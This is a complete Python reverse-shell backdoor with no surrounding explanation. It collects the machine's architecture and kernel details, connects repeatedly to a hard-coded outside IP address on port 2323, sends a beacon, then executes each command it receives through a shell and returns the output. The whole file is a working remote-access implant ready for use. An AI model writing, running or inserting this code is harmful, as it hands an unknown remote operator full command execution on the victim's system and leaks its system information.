#!/usr/bin/python
import socket,subprocess,time,os
arch = os.popen("arch").read()
if arch == '':
 arch = "x"
info = os.popen("uname -a").read()
if info == '':
 info = "x"
ip = "146.70.50.2"
port = 2323
while True:
        print ("Try To Connect ...")
        s = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        x = s.getsockopt( socket.SOL_SOCKET, socket.SO_KEEPALIVE)
        if( x == 0):
            x = s.setsockopt( socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        try:
            ipf = socket.gethostbyname(ip)
            s.connect((ipf,port))
        except socket.error:
            time.sleep( 10)
            continue
        seg=('x'+'|'+'1.1.5'+'|'+'x'+'|'+str(arch)+'|'+str(info)+'|Lix8q').encode('utf-8')
        s.send(seg)
        print ("Done Connected !!!")
        while 1:
            try:
                data1 = s.recv(1024)
                data = data1.decode("utf-8")
                if data.startswith('ZeXro0')==True:
                    data = ('')
                else:
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    u=(b'')
                    while True:
                      line = proc.stdout.readline()
                      u+=line + (b"|")
                      if line == (b''):  
                          break
                    s.send(bytes(u))
                    s.send(b"BoXer")             
            except socket.timeout:
                time.sleep(0)
                continue
            except:
                break
        try:
            s.close()
        except:
            pass
